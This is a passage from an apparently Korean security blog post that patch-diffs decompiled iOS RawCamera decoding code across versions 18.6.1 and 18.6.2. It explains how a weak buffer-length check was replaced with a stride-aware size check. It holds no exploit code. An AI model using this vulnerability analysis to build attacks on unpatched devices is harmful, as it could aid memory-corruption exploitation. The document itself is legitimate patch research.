class="hljs-keyword">if</span> ( CFDataGetLength_15(v16) != <span class="hljs-number">4</span> * a5 * a6 )  {    v45 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v45, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(v45, `typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error, <span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v18 = <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0xC</span>uLL);  *(_QWORD *)v18 = <span class="hljs-number">0L</span>L;  *((_DWORD *)v18 + <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;  v19 = (<span class="hljs-keyword">float32x2_t</span> *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0xC</span>uLL);  v20 = (<span class="hljs-keyword">float</span> *)v19;  v46 = v13;  v47 = v12;  v21 = (<span class="hljs-keyword">float64x2_t</span> *)a1[<span class="hljs-number">231</span>];  v50 = a5;  <span class="hljs-keyword">if</span> ( a1[<span class="hljs-number">232</span>] - (_QWORD)v21 &lt; <span class="hljs-number">0x11</span>uLL )  {    v22 = <span class="hljs-number">0L</span>L;    v23 = <span class="hljs-number">0.0</span>;  }  <span class="hljs-keyword">else</span>  {    v22 = vcvt_f32_f64(*v21);    *(<span class="hljs-keyword">float32x2_t</span> *)v18 = v22;    v23 = v21[<span class="hljs-number">1</span>].f64[<span class="hljs-number">0</span>];    *((<span class="hljs-keyword">float</span> *)v18 + <span class="hljs-number">2</span>) = v23;  }  v24 = (<span class="hljs-keyword">float32x2_t</span>)vdup_n_s32(<span class="hljs-number">0x437F0000</span>u);  *v19 = vdiv_f32(v24, vsub_f32(v24, v22));  v19[<span class="hljs-number">1</span>].f32[<span class="hljs-number">0</span>] = <span class="hljs-number">255.0</span> / (<span class="hljs-keyword">float</span>)(<span class="hljs-number">255.0</span> - v23);  <span class="hljs-keyword">if</span> ( a6 )  {    v52 = <span class="hljs-number">0L</span>L;    v25 = <span class="hljs-number">0</span>;    v26 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> ( v50 &gt;= a3 )      v27 = a3;    <span class="hljs-keyword">else</span>      v27 = v50;    v49 = v17;    <span class="hljs-keyword">do</span>    {      v28 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + <span class="hljs-number">40L</span>L))(a1);      BytePtr_16 = CFDataGetBytePtr_16(v17);      <span class="hljs-keyword">if</span> ( v50 )      {        v31 = &amp;BytePtr_16[BytesPerRow_3 * v52];        v32 = (_WORD *)(a2 + <span class="hljs-number">2L</span>L * (v25 + a8 + (v26 + a7) * a3) * v28);        v33 = v50;        <span class="hljs-keyword">do</span>        {          LOBYTE(v30) = *v31;          v34 = *((<span class="hljs-keyword">float</span> *)v18 + <span class="hljs-number">1</span>);          v35 = v20[<span class="hljs-number">1</span>];          v36 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v30) - *(<span class="hljs-keyword">float</span> *)v18) * *v20;          v37 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v36 &lt;= <span class="hljs-number">255.0</span> )            v38 = v36;          <span class="hljs-keyword">else</span>            v38 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v36 &gt;= <span class="hljs-number">0.0</span> )            v39 = v38;          <span class="hljs-keyword">else</span>            v39 = <span class="hljs-number">0.0</span>;          *v32 = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v39 + <span class="hljs-number">156</span>);<span class="hljs-comment">// R channel: LUT[clamp((R - blackR) * gainR)] -&gt; store 16-bit</span>          LOBYTE(v39) = v31[<span class="hljs-number">1</span>];          v40 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v39) - v34) * v35;          <span class="hljs-keyword">if</span> ( v40 &lt;= <span class="hljs-number">255.0</span> )            v41 = v40;          <span class="hljs-keyword">else</span>            v41 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v40 &gt;= <span class="hljs-number">0.0</span> )            v42 = v41;          <span class="hljs-keyword">else</span>            v42 = <span class="hljs-number">0.0</span>;          v32[<span class="hljs-number">1</span>] = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v42 + <span class="hljs-number">412</span>);<span class="hljs-comment">// G channel: LUT[clamp((G - blackG) * gainG)] -&gt; store 16-bit</span>          LOBYTE(v42) = v31[<span class="hljs-number">2</span>];          v43 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v42) - *((<span class="hljs-keyword">float</span> *)v18 + <span class="hljs-number">2</span>)) * v20[<span class="hljs-number">2</span>];          <span class="hljs-keyword">if</span> ( v43 &lt;= <span class="hljs-number">255.0</span> )            v37 = v43;          <span class="hljs-keyword">if</span> ( v43 &gt;= <span class="hljs-number">0.0</span> )            v30 = v37;          <span class="hljs-keyword">else</span>            v30 = <span class="hljs-number">0.0</span>;          v32[<span class="hljs-number">2</span>] = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v30 + <span class="hljs-number">668</span>);<span class="hljs-comment">// B channel: LUT[clamp((B - blackB) * gainB)] -&gt; store 16-bit</span>          <span class="hljs-keyword">if</span> ( ++v25 &gt;= v27 )          {            v25 = <span class="hljs-number">0</span>;            v32 = (_WORD *)(a2                          + <span class="hljs-number">2L</span>L * (a8 + (++v26 + a7) * a3) * (*(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> (__fastcall **)(_QWORD *))(*a1 + <span class="hljs-number">40L</span>L))(a1));          }          <span class="hljs-keyword">else</span>          {            v32 += <span class="hljs-number">3</span>;          }          v31 += <span class="hljs-number">4</span>;          --v33;        }        <span class="hljs-keyword">while</span> ( v33 );      }      ++v52;      v17 = v49;    }    <span class="hljs-keyword">while</span> ( v52 != Height_12 );  }  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v20)</span></span>;  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v18)</span></span>;  <span class="hljs-keyword">if</span> ( v17 )    CFRelease_60(v17);  <span class="hljs-keyword">if</span> ( v47 )    CFRelease_60(v47);  <span class="hljs-keyword">if</span> ( v46 )    CFRelease_60(v46);  <span class="hljs-keyword">if</span> ( ImageAtIndex )  {    <span class="hljs-keyword">if</span> ( ((vars8 ^ (<span class="hljs-number">2</span> * vars8)) &amp; <span class="hljs-number">0x4000000000000000</span>LL) != <span class="hljs-number">0</span> )      __break(<span class="hljs-number">0xC471</span>u);    CFRelease_60(ImageAtIndex);  }}</code></pre><pre><code class="hljs c"># iOS <span class="hljs-number">18.6</span><span class="hljs-number">.2</span> G100<span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD8A76DC</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        _QWORD *a1,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a3,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a6,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a7,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a8,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> UInt8 *a9,</span></span><span class="hljs-function"><span class="hljs-params">        CFIndex a10)</span></span><span class="hljs-function"></span>{  .  .  .      v13 = CFDataCreateWithBytesNoCopy_6(          (CFAllocatorRef)*kCFAllocatorDefault_ptr_0,          a9,          a10,          (CFAllocatorRef)*kCFAllocatorNull_ptr);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)CMPhotoDecompressionSessionCreate_1(v12, <span class="hljs-number">0L</span>L, &amp;v73) )  {    exception_15 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(exception_15, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      exception_15,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v74[<span class="hljs-number">5</span>] = *kCMPhotoDecompressionContainerOption_AllowedFormatsAndCodecs_ptr;  v74[<span class="hljs-number">3</span>] = *kCMPhotoContainerFormatString_JFIF_ptr;  v74[<span class="hljs-number">4</span>] = &amp;off_1F5F47C00;  v14 = sub_1DDABA420(OBJC_CLASS___NSDictionary_ptr_0);  v15 = (<span class="hljs-keyword">void</span> *)objc_claimAutoreleasedReturnValue_94(v14);  v74[<span class="hljs-number">6</span>] = v15;  v16 = sub_1DDABA420(OBJC_CLASS___NSDictionary_ptr_0);  v17 = (<span class="hljs-keyword">void</span> *)objc_claimAutoreleasedReturnValue_94(v16);  objc_release(v15);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)CMPhotoDecompressionSessionCreateContainer_1(v73, v17, v13, <span class="hljs-number">0L</span>L, &amp;v72) )  {    v52 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v52, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v52,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v70 = <span class="hljs-number">0L</span>L;  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)CMPhotoDecompressionContainerGetImageCount_0(v72, &amp;v70) || v70 &lt;= <span class="hljs-number">0</span> )  {    v53 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v53, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v53,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v74[<span class="hljs-number">1</span>] = *kCMPhotoDecompressionOption_OutputPixelFormat_ptr;  v74[<span class="hljs-number">2</span>] = &amp;off_1F5F487D0;  v18 = sub_1DDABA420(OBJC_CLASS___NSDictionary_ptr_0);  v19 = objc_claimAutoreleasedReturnValue_94(v18);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)CMPhotoDecompressionContainerCreateImageForIndex_1(v72, <span class="hljs-number">0L</span>L, v19, <span class="hljs-number">2L</span>L, &amp;v71) )  {    v54 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v54, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v54,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  BytesPerRow_11 = CVPixelBufferGetBytesPerRow_11(v71);  DataSize_0 = CVPixelBufferGetDataSize_0(v71);  v69 = a6;  v74[<span class="hljs-number">0</span>] = a5;  v21 = *(_QWORD *)sub_1DD8A8C14(v74, &amp;v69);  v68 = <span class="hljs-number">4</span>;  v74[<span class="hljs-number">0</span>] = v21;  <span class="hljs-keyword">if</span> ( DataSize_0 != *(_QWORD *)sub_1DD8A8C7C(v74, &amp;v68) )  {    v55 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v55, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v55,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v22 = (<span class="hljs-keyword">float</span> *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0xC</span>uLL);  *(_QWORD *)v22 = <span class="hljs-number">0L</span>L;  v22[<span class="hljs-number">2</span>] = <span class="hljs-number">0.0</span>;  v23 = (<span class="hljs-keyword">float</span> *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0xC</span>uLL);  v24 = v23;  __asm { FMOV            V0<span class="hljs-number">.2</span>S, #<span class="hljs-number">1.0</span> }  *(_QWORD *)v23 = _D0;  v23[<span class="hljs-number">2</span>] = <span class="hljs-number">1.0</span>;  v30 = (<span class="hljs-keyword">float64x2_t</span> *)a1[<span class="hljs-number">231</span>];  <span class="hljs-keyword">if</span> ( a1[<span class="hljs-number">232</span>] - (_QWORD)v30 &lt; <span class="hljs-number">0x11</span>uLL )  {    v31 = <span class="hljs-number">0L</span>L;    v32 = <span class="hljs-number">0.0</span>;  }  <span class="hljs-keyword">else</span>  {    v31 = vcvt_f32_f64(*v30);    *(<span class="hljs-keyword">float32x2_t</span> *)v22 = v31;    v32 = v30[<span class="hljs-number">1</span>].f64[<span class="hljs-number">0</span>];    v22[<span class="hljs-number">2</span>] = v32;  }  v33 = (<span class="hljs-keyword">float32x2_t</span>)vdup_n_s32(<span class="hljs-number">0x437F0000</span>u);  *(<span class="hljs-keyword">float32x2_t</span> *)v23 = vdiv_f32(v33, vsub_f32(v33, v31));  v23[<span class="hljs-number">2</span>] = <span class="hljs-number">255.0</span> / (<span class="hljs-keyword">float</span>)(<span class="hljs-number">255.0</span> - v32);  <span class="hljs-keyword">if</span> ( CVPixelBufferLockBaseAddress_11(v71, <span class="hljs-number">0L</span>L) )  {    v56 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v56, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v56,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v57 = (<span class="hljs-keyword">void</span> *)v19;  v58 = v13;  BaseAddress_11 = (<span class="hljs-keyword">char</span> *)CVPixelBufferGetBaseAddress_11(v71);  <span class="hljs-keyword">if</span> ( a6 )  {    v35 = <span class="hljs-number">0L</span>L;    v36 = <span class="hljs-number">0</span>;    v37 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> ( a5 &gt;= a3 )      v38 = a3;    <span class="hljs-keyword">else</span>      v38 = a5;    v62 = BaseAddress_11 + <span class="hljs-number">2</span>;    v59 = a5;    <span class="hljs-keyword">do</span>    {      v39 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + <span class="hljs-number">40L</span>L))(a1);      v61 = v35;      <span class="hljs-keyword">if</span> ( a5 )      {        v41 = v62;        v42 = (_WORD *)(a2 + <span class="hljs-number">2L</span>L * (v36 + a8 + (v37 + a7) * a3) * v39);        <span class="hljs-keyword">do</span>        {          LOBYTE(v40) = *v41;          v43 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v40) - v22[<span class="hljs-number">2</span>]) * v24[<span class="hljs-number">2</span>];          v44 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v43 &lt;= <span class="hljs-number">255.0</span> )            v45 = v43;          <span class="hljs-keyword">else</span>            v45 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v43 &gt;= <span class="hljs-number">0.0</span> )            v46 = v45;          <span class="hljs-keyword">else</span>            v46 = <span class="hljs-number">0.0</span>;          *v42 = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v46 + <span class="hljs-number">668</span>);          LOBYTE(v46) = *(v41 - <span class="hljs-number">1</span>);          v47 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v46) - v22[<span class="hljs-number">1</span>]) * v24[<span class="hljs-number">1</span>];          <span class="hljs-keyword">if</span> ( v47 &lt;= <span class="hljs-number">255.0</span> )            v48 = v47;          <span class="hljs-keyword">else</span>            v48 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v47 &gt;= <span class="hljs-number">0.0</span> )            v49 = v48;          <span class="hljs-keyword">else</span>            v49 = <span class="hljs-number">0.0</span>;          v42[<span class="hljs-number">1</span>] = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v49 + <span class="hljs-number">412</span>);          LOBYTE(v49) = *(v41 - <span class="hljs-number">2</span>);          v50 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v49) - *v22) * *v24;          <span class="hljs-keyword">if</span> ( v50 &lt;= <span class="hljs-number">255.0</span> )            v44 = v50;          <span class="hljs-keyword">if</span> ( v50 &gt;= <span class="hljs-number">0.0</span> )            v40 = v44;          <span class="hljs-keyword">else</span>            v40 = <span class="hljs-number">0.0</span>;          v42[<span class="hljs-number">2</span>] = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v40 + <span class="hljs-number">156</span>);          <span class="hljs-keyword">if</span> ( ++v36 &gt;= v38 )          {            v36 = <span class="hljs-number">0</span>;            v42 = (_WORD *)(a2                          + <span class="hljs-number">2L</span>L * (a8 + (++v37 + a7) * a3) * (*(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> (__fastcall **)(_QWORD *))(*a1 + <span class="hljs-number">40L</span>L))(a1));          }          <span class="hljs-keyword">else</span>          {            v42 += <span class="hljs-number">3</span>;          }          v41 += <span class="hljs-number">4</span>;          --a5;        }        <span class="hljs-keyword">while</span> ( a5 );      }      v35 = v61 + <span class="hljs-number">1</span>;      v62 += BytesPerRow_11;      a5 = v59;    }    <span class="hljs-keyword">while</span> ( v61 + <span class="hljs-number">1</span> != a6 );  }  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v24)</span></span>;  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v22)</span></span>;  objc_release(v57);  objc_release(v17);  <span class="hljs-keyword">if</span> ( v58 )    CFRelease_60(v58);  <span class="hljs-keyword">if</span> ( v73 )    CFRelease_60(v73);  <span class="hljs-keyword">if</span> ( v72 )    CFRelease_60(v72);  CVPixelBufferUnlockBaseAddress_11(v71, <span class="hljs-number">0L</span>L);  <span class="hljs-keyword">if</span> ( v71 )    CFRelease_60(v71);}</code></pre><p>&#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB2C8; &#xD06C;&#xAC8C; 3&#xAC00;&#xC9C0; &#xC815;&#xB3C4;&#xAC00; &#xBCC0;&#xACBD;&#xB41C; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ol><li><p><strong>CGImage* &#x2192; CMPhoto + CVPixelBuffer</strong></p><p> <strong>G90 (18.6.1)</strong></p><ul><li><p>CGImageSourceCreateWithData &#x2192; CGImageSourceCreateImageAtIndex&#xB85C; CGImage&#xB97C; &#xB9CC;&#xB4E0; &#xB4A4;</p><p>  CGImageGetDataProvider &#x2192; CGDataProviderCopyData&#xB85C; <strong>&#xD3C9;&#xBA74; &#xBC14;&#xC774;&#xD2B8; &#xBC84;&#xD37C;(CFData)</strong>&#xB97C; &#xC9C1;&#xC811; &#xC5BB;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xD3ED;&#xB7;&#xB192;&#xC774;&#xC640; CFDataGetLength() == 4<em>w</em>h&#xB9CC; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xBC14;&#xC774;&#xD2B8; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC21C;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>G100 (18.6.2)</strong></p></li><li><p>&#xC0C8;&#xB85C;&#xC6B4; <strong>CMPhoto</strong> &#xB514;&#xCF54;&#xB529; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>CMPhotoDecompressionSessionCreate</li><li>CMPhotoDecompressionSessionCreateContainer (&#xCEE8;&#xD14C;&#xC774;&#xB108; &#xC635;&#xC158;&#xC5D0; <strong>JFIF</strong> &#xC9C0;&#xC815;)</li><li>CMPhotoDecompressionContainerCreateImageForIndex &#x2192; <strong>CVPixelBuffer</strong> &#xD68D;&#xB4DD;</li></ul></li><li>&#xC774;&#xD6C4; CVPixelBufferLockBaseAddress / GetBaseAddress&#xB85C; <strong>&#xD53D;&#xC140; &#xBC84;&#xD37C;&#xB97C; &#xC7A0;&#xADF8;&#xACE0; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC811;&#xADFC;</strong>&#xD569;&#xB2C8;&#xB2E4;.</li><li>__stack_chk_guard&#xB3C4; &#xCD94;&#xAC00;</li></ul></li><li><p><strong>&#xBC84;&#xD37C; &#xD06C;&#xAE30; &#xAC80;&#xC99D; &#xCD94;&#xAC00;</strong></p><p> <strong>G90 (18.6.1)</strong></p> <pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (CFDataGetLength(data) != <span class="hljs-number">4</span> * width * height) <span class="hljs-keyword">throw</span> RawCameraException;</code></pre><ul><li>&#xB2E8;&#xC21C;&#xD788; 4<em>w</em>h&#xC640; CFData &#xAE38;&#xC774;&#xB9CC; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;.</li><li><p>bytesPerRow&#xB098; &#xCD9C;&#xB825; &#xD3EC;&#xB9F7; &#xBCC0;&#xD654;&#xC5D0; &#xB530;&#xB978; &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30; &#xBCC0;&#xB3D9;&#xC744; &#xBC18;&#xC601;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>G100 (18.6.2)</strong></p><pre><code class="hljs cpp">BytesPerRow = CVPixelBufferGetBytesPerRow(buf);DataSize    = CVPixelBufferGetDataSize(buf);<span class="hljs-comment">// expected = f(width, height)  // sub_1DD8A8C14</span><span class="hljs-comment">// bpp = 4                       // v68=4 &#x2192; sub_1DD8A8C7C</span><span class="hljs-keyword">if</span> (DataSize != expected) <span class="hljs-keyword">throw</span> RawCameraException;</code></pre></li><li><p><strong>&#xC2E4;&#xC81C; &#xD53D;&#xC140;&#xBC84;&#xD37C;&#xC758; &#xCD1D; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30;</strong>(CVPixelBufferGetDataSize)&#xC640;, &#xB0B4;&#xBD80; &#xD5EC;&#xD37C;(sub_1DD8A8C14/7C)&#xAC00; &#xACC4;&#xC0B0;&#xD55C; <strong>&#xAE30;&#xB300;&#xCE58;</strong>&#xB97C; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li>&#xAE30;&#xB300;&#xCE58;&#xB294; width/height/bpp(=4)&#xBFD0; &#xC544;&#xB2C8;&#xB77C; <strong>stride(&#xD589;&#xBCC4; &#xBC14;&#xC774;&#xD2B8; &#xC218;)</strong> &#xAC19;&#xC740; &#xD604;&#xC2E4; &#xC694;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB41C; &#xD615;&#xD0DC;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</li><li><p>&#xBD88;&#xC77C;&#xCE58; &#xC2DC; &#xC989;&#xC2DC; &#xC608;&#xC678;&#xB97C; &#xB358;&#xC838; &#xD6C4;&#xC18D; &#xC4F0;&#xAE30; &#xACBD;&#xB85C; &#xC9C4;&#xC785;&#xC744; &#xB9C9;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#x2192; CFData&#xC758; &#xCD94;&#xC0C1;&#xC801; &#xAE38;&#xC774; &#xBE44;&#xAD50; &#x2192; CVPixelBuffer&#xC758; &#xC2E4;&#xC81C; &#xBA54;&#xBAA8;&#xB9AC; &#xBC30;&#xCE58; &#xAE30;&#xBC18; &#xBE44;&#xAD50;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p></li></ul></li><li><p><strong>&#xD53D;&#xC140; &#xD3EC;&#xB9F7;/&#xCC44;&#xB110; &#xC811;&#xADFC; &#xC21C;&#xC11C;</strong></p><p> <strong>G90 (18.6.1)</strong></p><ul><li>BytePtr&#xC5D0;&#xC11C; <strong>R, G, B</strong> &#xC21C;&#xC73C;&#xB85C; &#xC77D;&#xACE0;(LUT &#xC624;&#xD504;&#xC14B; +156 / +412 / +668), 16-bit&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xC5EC; dst += 3 &#xD615;&#xD0DC;&#xB85C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</li><li><p>&#xD589; &#xC774;&#xB3D9;&#xC740; BytesPerRow * y&#xB97C; &#xB354;&#xD574; &#xCC98;&#xB9AC;</p><p><strong>G100 (18.6.2)</strong></p></li><li><p>CVPixelBufferGetBaseAddress()&#xB85C; &#xAE30;&#xBC18; &#xC8FC;&#xC18C;&#xB97C; &#xC5BB;&#xC740; &#xB4A4;, <strong>base + 2&#xC5D0;&#xC11C; &#xC2DC;&#xC791;</strong>&#xD574; B &#x2192; G &#x2192; R &#xC21C;&#xC73C;&#xB85C; &#xC77D;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>v41(=base+2) &#x2192; <strong>B</strong> &#x2192; LUT(+668)</li><li>(v41-1)(=base+1) &#x2192; <strong>G</strong> &#x2192; LUT(+412)</li><li>(v41-2)(=base+0) &#x2192; <strong>R</strong> &#x2192; LUT(+156)</li><li>&#xC774;&#xD6C4; v41 += 4 (&#xB2E4;&#xC74C; &#xD53D;&#xC140;)</li></ul><p>&#x2192; &#xC785;&#xB825; &#xD3EC;&#xB9F7;&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; BGRA/ RGBA &#xACC4;&#xC5F4;&#xB85C; &#xAC04;&#xC8FC;&#xD558;&#xACE0; &#xCC44;&#xB110; &#xC624;&#xD504;&#xC14B;&#xC744; &#xACE0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. </p></li></ul></li></ol><p>&#xBCC0;&#xACBD; &#xC810;&#xC774; &#xC788;&#xB358; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xB300;&#xB7B5;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB5A4; &#xB3D9;&#xC791;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xC9C0; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC694;&#xC57D;&#xD558;&#xC790;&#xBA74;, G90(18.6.1)&#xC740; CGImage &#xACBD;&#xB85C;&#xB85C; &#xB514;&#xCF54;&#xB529;&#xD55C; &#xB4A4; CFData&#xB97C; &#xC9C1;&#xC811; &#xC21C;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB54C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC0AC;&#xC2E4;&#xC0C1; &#x2018;&#xD3ED;&#xACFC; &#xB192;&#xC774;&#xC758; &#xC77C;&#xCE58;&#x2019; &#xC640; &#x2018;CFDataGetLength() == 4 